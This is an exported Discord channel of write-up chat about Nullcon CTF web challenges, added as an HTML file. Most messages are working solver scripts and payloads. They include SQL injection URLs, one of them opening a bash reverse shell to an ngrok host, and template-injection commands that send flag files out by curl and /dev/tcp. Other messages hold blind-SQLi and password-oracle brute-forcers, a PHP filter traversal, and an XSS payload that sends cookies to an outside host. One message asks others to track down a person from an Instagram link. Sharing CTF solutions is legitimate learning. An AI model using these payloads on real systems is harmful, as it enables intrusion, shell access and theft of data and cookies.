@@ -1,0 +1,1360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CTFdi</title>
+  <style>
+    :root {
+        --primary: #ff2e63;   /* neon red/pink */
+        --secondary: #162447;
+        --accent: #08d9d6;    /* neon blue/cyan */
+        --background: #0a0a0f;
+        --surface: rgba(20, 20, 40, 0.9);
+        --text: #e6f1ff;
+    }
+
+    body {
+        font-family: 'Press Start 2P', monospace;
+        background-color: var(--background);
+        color: var(--text);
+        margin: 0;
+        padding: 20px;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        font-size: 14px; /* bigger font */
+    }
+
+    .chat {
+        width: 100%;
+        max-width: 800px;
+        height: 500px;
+        overflow-y: auto;
+        background: var(--surface);
+        border-radius: 8px;
+        box-shadow: 0 0 25px rgba(255, 46, 99, 0.3);
+        padding: 12px;
+        display: flex;
+        flex-direction: column-reverse;
+    }
+
+    .message {
+        margin: 12px 0;
+        padding: 10px;
+        border-radius: 6px;
+        background: rgba(15, 15, 25, 0.85);
+        box-shadow: 0 0 6px rgba(8, 217, 214, 0.3);
+        font-size: 14px;
+        line-height: 1.5;
+    }
+
+    .timestamp {
+        font-size: 11px;
+        color: var(--primary); /* red timestamps */
+        margin-bottom: 4px;
+        display: block;
+        opacity: 0.55;
+    }
+
+    #summary {
+        width: 100%;
+        max-width: 800px;
+        margin: 30px auto;
+        padding: 20px;
+        background: var(--surface);
+        line-height: 1.6;
+        border-radius: 8px;
+        box-shadow: 0 0 20px rgba(8, 217, 214, 0.3);
+        font-size: 14px;
+    }
+
+    .content a {
+        color: var(--accent); /* blue links */
+        text-decoration: none;
+        font-weight: bold;
+    }
+
+    .content a:hover {
+        opacity: 0.8;
+        text-decoration: underline;
+    }
+
+    /* CRT scanline effect */
+    .scanline {
+        background: linear-gradient(to bottom,
+            rgba(255, 255, 255, 0) 0%,
+            rgba(255, 255, 255, 0.05) 10%,
+            rgba(255, 255, 255, 0) 100%);
+        animation: scanline 8s linear infinite;
+        pointer-events: none;
+    }
+
+    @keyframes scanline {
+        0% { transform: translateY(-100%); }
+        100% { transform: translateY(100%); }
+    }
+</style>
+</head>
+<body>
+  <h1>Channel: [data/ctfs/nullcon25/web_666188462038450176.json]</h1>
+  <h3>Writeup Chat</h3>
+  <div id="chat" class="chat">
+    <div class="message">
+      <span class="timestamp">2025-09-05T13:49:18.346000+00:00</span>
+      <div class="content"><a href="https://jia.je/ctf-writeups/2025-09-04-nullcon-berlin-hackim-2025-ctf/webby.html" target="_blank">https://jia.je/ctf-writeups/2025-09-04-nullcon-berlin-hackim-2025-ctf/webby.html</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-05T13:28:39.171000+00:00</span>
+      <div class="content">[suthtnonao](<a href="https://cdn.discordapp.com/emojis/1139156087266881668.webp?size=48&amp;name=suthtnonao)" target="_blank">https://cdn.discordapp.com/emojis/1139156087266881668.webp?size=48&amp;name=suthtnonao)</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-05T13:18:45.125000+00:00</span>
+      <div class="content"><a href="https://www.php.net/manual/en/function.str-shuffle.php" target="_blank">https://www.php.net/manual/en/function.str-shuffle.php</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-05T12:55:05.277000+00:00</span>
+      <div class="content">```
+import requests
+import re
+import string
+
+url = "<a href="http://52.59.124.14:5015/login.php"" target="_blank">http://52.59.124.14:5015/login.php"</a>
+
+headers = {
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "Accept-Language": "en,zh-CN;q=0.9,zh;q=0.8,th;q=0.7",
+    "Cache-Control": "max-age=0",
+    "Connection": "keep-alive",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "DNT": "1",
+    "Origin": "<a href="http://52.59.124.14:5015"," target="_blank">http://52.59.124.14:5015",</a>
+    "Referer": "<a href="http://52.59.124.14:5015/index.php"," target="_blank">http://52.59.124.14:5015/index.php",</a>
+    "Upgrade-Insecure-Requests": "1",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+}
+
+cookies = {
+    "PHPSESSID": "3c7527c2bde2f870feaceab499362889"
+}
+
+username = "admin"   # target user
+charset = string.ascii_letters + string.digits + string.punctuation
+
+def check_password(test_pwd):
+    data = {"username": username, "password": test_pwd}
+    r = requests.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=True)
+    m = re.search(r"got (\d+) characters", r.text)
+    if m:
+        return int(m.group(1))
+    return -1
+
+found = ""
+
+# 🔹 Keep going until we get all 16 characters
+while len(found) &lt; 16:
+    for ch in charset:
+        attempt = found + ch
+        correct = check_password(attempt)
+        if correct == len(attempt):
+            found += ch
+            print(f"[+] Found character {len(found)}: '{ch}'  --&gt; {found}")
+            break
+    else:
+        print("[!] No matching character found in this round, stopping.")
+        break
+
+print(f"✅ Final password guess: {found}")
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-05T12:03:06.798000+00:00</span>
+      <div class="content">for gathering the flag path, i used
+
+<a href="http://52.59.124.14:5021/?order=1%3BSET%20ROLE%20pg_execute_server_program%3BDROP%20TABLE%20IF%20EXISTS%20t%3BCREATE%20TEMP%20TABLE%20t(line%20text)%3BCOPY%20t%20FROM%20PROGRAM%20%27cat%20/flag.txt%27%3BSELECT%20line%2C1%2C1%20FROM%20t%3B--" target="_blank">http://52.59.124.14:5021/?order=1%3BSET%20ROLE%20pg_execute_server_program%3BDROP%20TABLE%20IF%20EXISTS%20t%3BCREATE%20TEMP%20TABLE%20t(line%20text)%3BCOPY%20t%20FROM%20PROGRAM%20%27cat%20/flag.txt%27%3BSELECT%20line%2C1%2C1%20FROM%20t%3B--</a>
+
+which is create a blank cell, even we cant create table</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-05T11:26:23.722000+00:00</span>
+      <div class="content"><a href="https://www.percona.com/blog/postgresql-role-inheritance-at-a-glance/" target="_blank">https://www.percona.com/blog/postgresql-role-inheritance-at-a-glance/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-05T11:19:00.025000+00:00</span>
+      <div class="content">[AShmm](<a href="https://cdn.discordapp.com/emojis/582388553351299092.gif?size=48&amp;animated=true&amp;name=AShmm)" target="_blank">https://cdn.discordapp.com/emojis/582388553351299092.gif?size=48&amp;animated=true&amp;name=AShmm)</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-05T11:04:46.064000+00:00</span>
+      <div class="content"><a href="http://52.59.124.14:5021/?order=1%3BSET%20ROLE%20pg_execute_server_program%3BCOPY%20(SELECT%20'')%20TO%20PROGRAM%20'bash%20-c%20"exec%20bash%20-i%20&gt;%26%20/dev/tcp/0.tcp.ap.ngrok.io/12365%200&gt;%261"'%3BSELECT%20'shell'%2C1%2C1%3B--" target="_blank">http://52.59.124.14:5021/?order=1%3BSET%20ROLE%20pg_execute_server_program%3BCOPY%20(SELECT%20'')%20TO%20PROGRAM%20'bash%20-c%20"exec%20bash%20-i%20&gt;%26%20/dev/tcp/0.tcp.ap.ngrok.io/12365%200&gt;%261"'%3BSELECT%20'shell'%2C1%2C1%3B--</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-05T10:43:23.670000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/familiar-mario-supermarioglitchy4-smg4-skill-issue-gif-27060943" target="_blank">https://tenor.com/view/familiar-mario-supermarioglitchy4-smg4-skill-issue-gif-27060943</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-05T08:42:01.437000+00:00</span>
+      <div class="content">[pepehands](<a href="https://cdn.discordapp.com/emojis/1303538736134356992.webp?size=48&amp;name=pepehands)" target="_blank">https://cdn.discordapp.com/emojis/1303538736134356992.webp?size=48&amp;name=pepehands)</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-05T08:39:04.171000+00:00</span>
+      <div class="content">[FakeNitroEmoji](<a href="https://cdn.discordapp.com/emojis/1303537332485623889.gif?size=48&amp;animated=true&amp;name=FakeNitroEmoji)" target="_blank">https://cdn.discordapp.com/emojis/1303537332485623889.gif?size=48&amp;animated=true&amp;name=FakeNitroEmoji)</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-04T14:58:11.134000+00:00</span>
+      <div class="content"><a href="https://media.discordapp.net/attachments/914508501697576990/1314542204722741248/caption.gif?width=778&amp;height=671" target="_blank">https://media.discordapp.net/attachments/914508501697576990/1314542204722741248/caption.gif?width=778&amp;height=671</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-04T14:42:50.301000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/phineasand-ferb-doofenshmirtz-perry-watch-movie-gif-5271757" target="_blank">https://tenor.com/view/phineasand-ferb-doofenshmirtz-perry-watch-movie-gif-5271757</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-04T14:39:12.351000+00:00</span>
+      <div class="content"><a href="https://discord.com/channels/666188272103325716/666188462038450176/1413169374642176040" target="_blank">https://discord.com/channels/666188272103325716/666188462038450176/1413169374642176040</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-04T14:28:23.308000+00:00</span>
+      <div class="content"><a href="https://cdn.discordapp.com/attachments/1279939366684332042/1326991857972019211/attachment.gif" target="_blank">https://cdn.discordapp.com/attachments/1279939366684332042/1326991857972019211/attachment.gif</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-05T21:23:20.244000+00:00</span>
+      <div class="content">Me (and chatGPT) changed your script. It now prints the flag in order. Thank you
+
+```py
+from multiprocessing.pool import Pool
+import subprocess
+import httpx
+import re
+
+url = '<a href="http://52.59.124.14:5008'" target="_blank">http://52.59.124.14:5008'</a>
+
+get_index = {
+    "0": 27,  # MD5: 02e74f10e0327ad868d138f2b4fdd6f0
+    "1": 6,   # MD5: 1679091c5a880faf6fb5e6087eb1b2dc
+    "2": 51,  # MD5: 2838023a778dfaecdc212708f721b788
+    "3": 21,  # MD5: 3c59dc048e8850243be8079a5c74d079
+    "4": 9,   # MD5: 45c48cce2e2d7fbdea1afc51c7c6ad26
+    "5": 91,  # MD5: 54229abfcfa5649e7003b83dd4755294
+    "6": 11,  # MD5: 6512bd43d9caa6e02c990b0a82652dca
+    "7": 17,  # MD5: 70efdf2ec9b086079795c442636b55fb
+    "8": 7,   # MD5: 8f14e45fceea167a5a36dedd4bea2543
+    "9": 15,  # MD5: 9bf31c7ff062936a96d3c8bd1f8f2ff3
+    "a": 4,   # MD5: a87ff679a2f3e71d9181a67b7542122c
+    "b": 22,  # MD5: b6d767d2f8ed5d21a44b0e5886680cb9
+    "c": 0,   # MD5: cfcd208495d565ef66e7dff9f98764da
+    "d": 10,  # MD5: d3d9446802a44259755d38e6d163e820
+    "e": 3,   # MD5: eccbc87e4b5ce2fe28308fd9f2a7baf3
+    "f": 44,  # MD5: f7177163c833dff4b38fc8d2872f1ec6
+}
+
+
+alpha = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
+count = len(alpha)
+
+print('[*] Recovering Mersenne Twister seed')
+
+def brute_chunk(i):
+    hex_index = hex(i)[2:]
+    username = get_index[hex_index]
+
+    cook = httpx.post(url, data={'username': username, 'password': ''}).cookies.get('PHPSESSID')
+    idxs = [str(alpha.find(c)) for c in cook[:30]]
+
+    args = ['./php_mt_seed']
+    for x in idxs:
+        args.extend([x, x, "0", str(count-1)])
+
+    p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
+
+    while True:
+        line = p.stdout.readline()
+        if line:
+            if b'PHP 7.1.0+' in line:
+                segment = re.search(r'seed = 0x(\w{8})', line.decode()).groups()[0]
+                decoded = bytes.fromhex(segment).decode()
+                print(f'[{hex_index}] {decoded}')
+                return hex_index, decoded
+        else:
+            print(f'Fatal break on {hex_index}')
+            break
+
+results = dict(Pool(4).map(brute_chunk, range(0xb)))
+
+flag = ''.join(results[key] for key in sorted(results))
+print(f'\nFlag: {flag}')
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-04T13:40:14.546000+00:00</span>
+      <div class="content">My solver for sess.io
+```python
+from multiprocessing.pool import Pool
+import subprocess
+import httpx
+import re
+
+url = '<a href="http://52.59.124.14:5008'" target="_blank">http://52.59.124.14:5008'</a>
+
+get_index = {
+    "0": ("YpjTxMtK", "q6ffi5jS"),
+    "1": ("UA9vNHz9", "6qnqnyyO"),
+    "2": ("rcdDzYNl", "vePRxsqt"),
+    "3": ("YSXYMCp8", "4J6GUHqV"),
+    "4": ("fsxPfHzQ", "WipxsHIV"),
+    "5": ("U8kv2TLU", "8Dxb850z"),
+    "6": ("qTH9vbZK", "RfJc31Rq"),
+    "7": ("TkcE8SMd", "fYlMHUMj"),
+    "8": ("svSnGALr", "THC7m3BY"),
+    "9": ("LzMg6BW9", "WjA6Rrm9"),
+    "a": ("TkTglRhf", "T8RBDbYH"),
+    "b": ("GBSapPWT", "ZUx9opIc"),
+    "c": ("Q8bkl5mI", "mQo1CrD4"),
+    "d": ("HY6LYGB2", "H5eFowcX"),
+    "e": ("geZVS6bq", "EfdhWFMX"),
+    "f": ("adWFCksD", "kyfSEjh9"),
+}
+
+alpha = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
+count = len(alpha)
+
+print('[*] Recovering Mersenne Twister seed')
+def brute_chunk(i):
+    i = hex(i)[2:]
+    username, password = get_index[i]
+
+    cook = httpx.post(url, data={'username': username, 'password': password}).cookies.get('PHPSESSID')
+    idxs = [str(alpha.find(c)) for c in cook[:30]]
+
+    args = ['./php_mt_seed']
+    for x in idxs:
+        args.extend([x, x, "0", str(count-1)])
+    p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
+
+    while True:
+        line = p.stdout.readline()
+
+        if line:
+            if b'PHP 7.1.0+' in line:
+                segment = re.search(r'seed = 0x(\w{8})', line.decode()).groups()[0]
+                print(decoded := bytes.fromhex(segment).decode(), end='', flush=True)
+                return decoded
+        else:
+            print(f'Fatal break on {i}')
+            break
+
+results = Pool(4).map(brute_chunk, range(0xb))
+print(f'\nFlag: {"".join(results)}')
+```
+```
+ENO{ _SUP ER_S SOME ECUR AG_1 3333 E_FL ACK} 37_H
+
+ENO{SOME_SUPER_SECURE_FLAG_1333337_HACK}
+```
+## FLAG
+`ENO{SOME_SUPER_SECURE_FLAG_1333337_HACK}`</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-03T05:52:40.162000+00:00</span>
+      <div class="content"><a href="https://youtu.be/YB7-3jouC0c" target="_blank">https://youtu.be/YB7-3jouC0c</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-02T16:21:52.239000+00:00</span>
+      <div class="content">```python
+import requests as req
+import string
+
+url = "<a href="http://52.59.124.14:5015/?p=2,2"" target="_blank">http://52.59.124.14:5015/?p=2,2"</a>
+
+list_of_char = " "+string.ascii_letters+string.digits+"-=_"
+
+flag = ""
+
+counter = 1
+j=0
+for i in range(77):
+    print(f"Flag_so_far: {flag}")
+    for char in list_of_char:
+
+        temp = flag+char
+        payload = f" or (select value from flag) GLOB '{temp}*'"
+        #payload = f" or (select count(*) from flag) = {j}"
+        #payload = f" or (select length(value) from flag) = {j}"
+
+        response = req.get(url+payload)
+        if "Page 3 (ID=3) has content:" in response.text:
+            print(f"Found Char! {char}")
+            counter+=1
+            flag = temp
+            break
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-02T16:21:41.571000+00:00</span>
+      <div class="content">I see a bunch of ppl that imports `os` to solve `Temptation`, but is the following script the intended way ?
+```py
+import requests
+
+body = """
+$code:
+    self.update({"__body__": "FL"+"AG"})
+"""
+
+res = requests.post("<a href="http://52.59.124.14:5011/"," target="_blank">http://52.59.124.14:5011/",</a> data={"temptation": body, "submite": ""})
+print(res.text)
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-02T16:06:25.800000+00:00</span>
+      <div class="content">Here's a oneliner to get the flag:
+```sh
+curl "<a href="http://52.59.124.14:5015/?p=2,2+UNION+SELECT+*+FROM+flag--"" target="_blank">http://52.59.124.14:5015/?p=2,2+UNION+SELECT+*+FROM+flag--"</a> 2&gt;/dev/null | head -n 1 | cut -d '"' -f 2 | base64 -d
+```
+So the payload is:
+```sql
+2,2 UNION SELECT * FROM flag--
+```
+Here's a clickable link: <a href="http://52.59.124.14:5015/?p=2,2+UNION+SELECT+*+FROM+flag--" target="_blank">http://52.59.124.14:5015/?p=2,2+UNION+SELECT+*+FROM+flag--</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-02T15:59:31.618000+00:00</span>
+      <div class="content">Paginator v2 writeup:
+<a href="https://medium.com/@vspillai0701/paginator-v2-nullcon-ctf-2025-7bc5f8f445b4" target="_blank">https://medium.com/@vspillai0701/paginator-v2-nullcon-ctf-2025-7bc5f8f445b4</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-02T14:51:14.451000+00:00</span>
+      <div class="content">Well, you can index over parts of flag using first symbol of md5(username+pass) string. You can get yourself a set of 10 cracked md5 hashes starting with 0...9 respectively, those selecting 0...9'th part of the flag as your seed. You only have to recover prng's seed now.
+
+Login will produce a session that will consist of 1000 of php's Mersenne Twister values, which is enough to recover the seed. You can provide like 30 values to this little tool 🙂
+<a href="https://github.com/openwall/php_mt_seed" target="_blank">https://github.com/openwall/php_mt_seed</a>
+and this will recover a hex of a seed, which is your 4 chars of the flag</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-02T11:28:48.086000+00:00</span>
+      <div class="content">Numberizer: use these values: 1e99,1,0,1,0
+
+Bfail: the bcrypt function stops at byte number 72 so you only need to brute force the last byte
+
+Paginator: ?p=2,10 or 1=1
+
+PaginatorV2: wrote a script to extract the flag from flag table, mainly the payload was:  or (select value from flag) GLOB '{GUESS_CHAR_HERE}*'
+use GLOB instead of LIKE because it was base64 encoded so its case sensitive.  but u could use union select * from flag directly as it consists of 3 columns like the pages table [ didn't notice that till someone said it here lol 😅 ]
+
+Sess.io: the idea is about the SEED in random functions where if you used the same seed the same random values will occur, keeping that in mind if we review the source of the challenge we will find that it splits the flag to chunks of 4 and then use them as a SEED for the mt_rand function, it determine which part of the chucks will be used based on ur input [ the username&amp;password ], it concatenates them then get the md5 hash and use the first character of the md5 as an index of the chunk, so what we will do first is to get list of hashes from 0 --&gt; 9 to cover all the possible indexes in the array then save them into array or set to use them after that to brute-force the flag chunks, you can do this by setting the seed to the brute-forced 4 chars and then use the same session_id_secure function to get an id and if the output inside the array u saved before, that means its a valid chunk so append it to flag
+
+Temptation: ``` $__import__('os').system('curl+<a href="http://webhook/`cat+/tmp/f*.txt`')" target="_blank">http://webhook/`cat+/tmp/f*.txt`')</a> ```, you can execute code inside web.template.Template back to their doc for more info
+
+
+zoney: <a href="https://blog.n0va.in/posts/nullcon-writeup/" target="_blank">https://blog.n0va.in/posts/nullcon-writeup/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-02T10:45:49.547000+00:00</span>
+      <div class="content">But because of this check, where it checks the truthiness of `i.source` rather than checking whether it's present:
+```py
+        try:
+            i = web.input()
+            if i.source:
+                return open(__file__).read()
+        except Exception as e:
+            pass
+```
+It's not enough to go to <a href="http://52.59.124.14:5011/?source." target="_blank">http://52.59.124.14:5011/?source.</a> Bit sloppy on the author's part, especially because it's different from all the other challenges.</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-02T10:43:37.789000+00:00</span>
+      <div class="content">There was a comment here:
+```
+view-source:<a href="http://52.59.124.14:5011/" target="_blank">http://52.59.124.14:5011/</a>
+```
+Contents:
+```html
+&lt;html&gt;
+        &lt;head&gt;
+                &lt;title&gt;Temptation&lt;/title&gt;       
+        &lt;/head&gt;
+        &lt;body&gt;
+                &lt;h1&gt;Temptation challenge&lt;/h1&gt;
+                &lt;form action="/" method="POST"&gt;
+                        &lt;table&gt;
+    &lt;tr&gt;&lt;th&gt;&lt;label for="temptation"&gt;What is your temptation?&lt;/label&gt;&lt;/th&gt;&lt;td&gt;&lt;input id="temptation" name="temptation" type="password"/&gt;&lt;/td&gt;&lt;/tr&gt;
+    &lt;tr&gt;&lt;th&gt;&lt;label for="submit"&gt;&lt;/label&gt;&lt;/th&gt;&lt;td&gt;&lt;button id="submit" name="submit"&gt;submit&lt;/button&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;/table&gt;
+                &lt;/form&gt;
+                &lt;!-- Look at me, I'm soo tempting! /?source --&gt;
+        &lt;/body&gt;
+&lt;/html&gt;
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-02T10:42:02.523000+00:00</span>
+      <div class="content">Yes, you can get it here:
+<a href="http://52.59.124.14:5011/?source=1" target="_blank">http://52.59.124.14:5011/?source=1</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-02T08:55:18.218000+00:00</span>
+      <div class="content">Solver for Bfail
+```py
+import bcrypt
+import requests
+
+if __name__ == "__main__":
+    leak = b'\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9&lt;\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc@\xa9\xa1@\x9c\xeee\xe0\xe0\xf76'
+    expected = b'$2b$12$8bMrI6D9TMYXeMv8pq8RjemsZg.HekhkQUqLymBic/cRhiKRa3YPK'
+
+    i = 0
+    while i &lt; 255:
+        if bcrypt.checkpw(leak + bytes([i]), expected):
+            print(f"last byte is (decimal) {i}")
+            break
+        i += 1
+    
+    username = "admin"
+    password = leak + bytes([i])
+    data = {"username":username,"password":password}
+    
+    r = requests.get("<a href="http://52.59.124.14:5013/"," target="_blank">http://52.59.124.14:5013/",</a> data=data)
+    print(r.text)
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-02T08:51:17.699000+00:00</span>
+      <div class="content">I solved temptation  as follows:
+```py
+url = "<a href="http://52.59.124.14:5011"" target="_blank">http://52.59.124.14:5011"</a>  
+# url = "<a href="http://localhost:8080"" target="_blank">http://localhost:8080"</a>  
+import requests  
+ip = ~~~
+port = ~~~
+payload = f"""${__import__('os').system('bash -c "cat /tmp/fla* &gt; /dev/tcp/{ip}/{port}"')}"""  
+
+r = requests.post(url, data={"temptation": payload})  
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-02T08:42:20.726000+00:00</span>
+      <div class="content">BFail
+```
+import requests
+import urllib.parse
+
+url = "<a href="http://52.59.124.14:5013/"" target="_blank">http://52.59.124.14:5013/"</a>
+username = b'admin'
+password = b'\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9&lt;\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc@\xa9\xa1@\x9c\xeee\xe0\xe0\xf76\xaa'
+username = urllib.parse.quote(username)
+password = urllib.parse.quote(password)
+data = {
+    "username": username,
+    "password": password
+}
+
+response = requests.get(url, data=data)
+print(response.text)
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-02T08:39:02.178000+00:00</span>
+      <div class="content">use <a href="https://github.com/openwall/php_mt_seed" target="_blank">https://github.com/openwall/php_mt_seed</a> to crack the seed</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-02T08:38:53.760000+00:00</span>
+      <div class="content">`${__import__('os').popen('cat /tmp/fla* | base64 | curl -X POST -d @- <a href="https://webhook/lel').read()}`" target="_blank">https://webhook/lel').read()}`</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-02T08:38:45.244000+00:00</span>
+      <div class="content">```curl -v <a href="http://52.59.124.14:5011/" target="_blank">http://52.59.124.14:5011/</a> --data "temptation=\${__import__('os').system('curl file:///etc/passwd')}"```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-02T08:38:31.357000+00:00</span>
+      <div class="content">i used temptation=${__import__('os').system('curl+<a href="https://my_sever_ip_address/$(cat+/tmp/*|+base64)')}" target="_blank">https://my_sever_ip_address/$(cat+/tmp/*|+base64)')}</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-02T08:31:48.335000+00:00</span>
+      <div class="content"><a href="https://blog.n0va.in/posts/nullcon-writeup/" target="_blank">https://blog.n0va.in/posts/nullcon-writeup/</a> 
+
+
+ZONEy writeup</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-01T16:02:59.773000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/green-mile-im-tired-boss-michael-clarke-duncan-gif-2375696290766999196" target="_blank">https://tenor.com/view/green-mile-im-tired-boss-michael-clarke-duncan-gif-2375696290766999196</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-02-01T13:28:58.137000+00:00</span>
+      <div class="content"><a href="http://52.59.124.14:5011/?source" target="_blank">http://52.59.124.14:5011/?source</a> has no any thing</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-03-16T05:38:32.725000+00:00</span>
+      <div class="content"><a href="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403151152901.png" target="_blank">https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403151152901.png</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-03-15T14:55:44.400000+00:00</span>
+      <div class="content">just generate it using tools like this
+<a href="https://www.dcode.fr/ascii-85-encoding" target="_blank">https://www.dcode.fr/ascii-85-encoding</a>
+
+just make sure the value is equal to 0e1 (the decoded base85 from given password)
+so you need to determine a value that if encoded by base85 will gave result that equals to 0e1 (0e1 is 0)</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-03-15T11:47:07.185000+00:00</span>
+      <div class="content">the hostname of the service is shop, basically <a href="http://shop" target="_blank">http://shop</a> should be the localhost</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-03-15T11:20:33.141000+00:00</span>
+      <div class="content">traversaller:
+```py
+#!/usr/bin/env python3
+
+import requests
+import base64
+
+path = "php:.\\/\\\\/filter.//read=/var/www/html/static/convert.base64-encode.//resource=.//var.//www.//html.//flag.php"
+
+r = requests.get(f"<a href="http://localhost:5017/?path={path}")" target="_blank">http://localhost:5017/?path={path}")</a>
+print(base64.b64decode(r.content.decode()).decode())
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-03-15T11:13:12.893000+00:00</span>
+      <div class="content">and exploit:
+```html
+&lt;form action="<a href="http://shop/contest.php"" target="_blank">http://shop/contest.php"</a> method="POST" enctype="multipart/form-data"&gt;
+  &lt;input type="file" name="fileToUpload" id="fileToUpload"&gt;
+&lt;/form&gt;
+&lt;script&gt;
+  const file = new File(["foo"], "foo'&gt;&lt;svg onload=eval(atob('bG9jYXRpb249J2h0dHBzOi8vZWZlYXdzZGFzZGFzZGYuZnJlZS5iZWVjZXB0b3IuY29tLz9jPScrZG9jdW1lbnQuY29va2llOw=='))&gt;.jpg", {
+      type: "image/jpeg",
+  });
+
+  const dataTransfer = new DataTransfer();
+  dataTransfer.items.add(file);
+
+  const form = document.forms[0];
+  form.children[0].files = dataTransfer.files;
+
+  form.submit();
+&lt;/script&gt;
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-03-15T11:09:16.028000+00:00</span>
+      <div class="content">PoC of falafel shop2:
+```html
+&lt;form action="<a href="http://localhost:5010/contest.php"" target="_blank">http://localhost:5010/contest.php"</a> method="POST" enctype="multipart/form-data"&gt;
+    &lt;input type="file" name="fileToUpload" id="fileToUpload"&gt;
+&lt;/form&gt;
+&lt;script&gt;
+    const file = new File(["foo"], "foo'&gt;&lt;svg onload=alert()&gt;.jpg", {
+        type: "image/jpeg",
+    });
+
+    const dataTransfer = new DataTransfer();
+    dataTransfer.items.add(file);
+
+    const form = document.forms[0];
+    form.children[0].files = dataTransfer.files;
+
+    form.submit();
+&lt;/script&gt;
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-02-20T09:42:48.383000+00:00</span>
+      <div class="content">Hello guys need help <a href="https://www.instagram.com/ab_ki_baari_teri?igsh=NTc4MTIwNjQ2YQ==" target="_blank">https://www.instagram.com/ab_ki_baari_teri?igsh=NTc4MTIwNjQ2YQ==</a> pls find this guy</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-24T10:51:02.983000+00:00</span>
+      <div class="content"><a href="https://portswigger.net/web-security/" target="_blank">https://portswigger.net/web-security/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-20T08:18:29.098000+00:00</span>
+      <div class="content"><a href="https://discord.com/channels/666188272103325716/1008299547136634880/1142722127208927374" target="_blank">https://discord.com/channels/666188272103325716/1008299547136634880/1142722127208927374</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-20T07:44:36.477000+00:00</span>
+      <div class="content">1. You Could Have Guessed Manually
+2. Let Cipher Identifier Guess
+&lt;<a href="https://www.dcode.fr/cipher-identifier&gt;" target="_blank">https://www.dcode.fr/cipher-identifier&gt;</a>
+3. Let Hashcat Guess
+```bash
+└─$ hashcat --show F1DB68C4A85C6B18D2955D39B512C40F8096C142 # One Of The Hashes From DB
